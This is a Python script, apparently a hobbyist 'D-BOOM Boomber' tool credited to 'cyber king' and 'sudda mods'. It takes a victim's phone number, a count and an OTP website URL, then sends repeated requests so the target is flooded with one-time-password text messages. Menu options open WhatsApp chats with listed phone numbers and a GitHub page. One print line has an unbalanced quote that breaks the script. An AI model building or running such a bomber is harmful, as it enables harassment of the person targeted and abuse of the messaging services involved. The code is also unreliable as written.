#tool by cyber king
#This tool is created using python.
import os
import requests
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'

def boomber():
    num=input (h+"[+] enter phone number :")
    print("★━━━━━━━━━━━━★★━━━━━━━━━━━━★★━━━━━━━━━━━━★")
    amount=int(input(m+"enter your amount : "))
    print("★━━━━━━━━━━━━★★━━━━━━━━━━━━★★━━━━━━━━━━━━★")
    x=input (bm+"[+] [ otp website ] enter url : ")
    print("★━━━━━━━━━━━━★★━━━━━━━━━━━━★★━━━━━━━━━━━━★")
    
    url=(x)
    
    para={
    'number':num  
    }
    for i in range (0,amount):
        respose=requests.get(url,para)
        print("𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗦𝗘𝗡𝗧 𝗬𝗢𝗨 𝗪𝗜𝗡 👍")
        print("★━━━━━━━━━━━━★★━━━━━━━━━━━━★"")
    
        
    
def cyberking():
    os.system ('xdg-open https://api.whatsapp.com/send?phone=94717804134')
def suddamods():
    os.system ('xdg-open https://api.whatsapp.com/send?phone=94717459749')
def flowebg():   
    os.system ('xdg-open https://github.com/Cyberking12346')
def hel():
    print (k+"-----If you need any help, see an admin-----")
os.system ('clear')    
        
def main():        
    print(" ")
    print(m+"           ██████╗        ██████╗  █████╗   ███╗   ███╗")
    print(m+"           ██╔══██╗       ██╔══██╗██╔══██╗ ████╗ ████║")
    print(m+"           ██║  ██║█████╗██████╦╝██║    ██║██╔████╔██║")
    print(m+"           ██║  ██║╚════╝██╔══██╗██║    ██║██║╚██╔╝██║")
    print(m+"           ██████╔╝       ██████╦╝╚█████╔╝ ██║ ╚═╝ ██║")
    print(m+"           ╚═════╝        ╚═════╝  ╚════╝   ╚═╝      ╚═╝")
    print("")
    print(m+"              ██████████████████████████████████████")
    print(m+"              █▄─▄─▀█─▄▄─█▄─▀█▀─▄█▄─▄─▀█▄─▄▄─█▄─▄▄▀█")
    print(m+"              ██─▄─▀█─██─██─█▄█─███─▄─▀██─▄█▀██─▄─▄█")
    print(m+"              ▀▄▄▄▄▀▀▄▄▄▄▀▄▄▄▀▄▄▄▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀")
    print(m+"_______________________________________________________________________________")
    print("")
    print("")
    print(b+"                          tool by - cyber king ")
    print(b+"                                sudda mods ")
    print("")
    print("")
    print(k+"                [1] start :                 [2] contact cyber king : ")
    print("")
    print(k+"                [3] contact sudda mods :    [4] my github tool : ")
    print("")
    print(k+"                [5] help : ")
 
    choice=int(input (bm+"[+] enter your choice : "))
    print("★━━━━━━━━━━━━★★━━━━━━━━━━━━★★━━━━━━━━━━━━★★━━━━━━━━━━━━★★━━━━━━━━━━━━★")
    if choice == 1:
        boomber()
    elif choice ==2:
        cyberking()
    elif choice ==3:
        suddamods()
    elif choice ==4:
        flowebg()
    elif choice ==5:
        hel()                 
    else:
        print (bm+"_________There is no such number_________😔")        
    
main()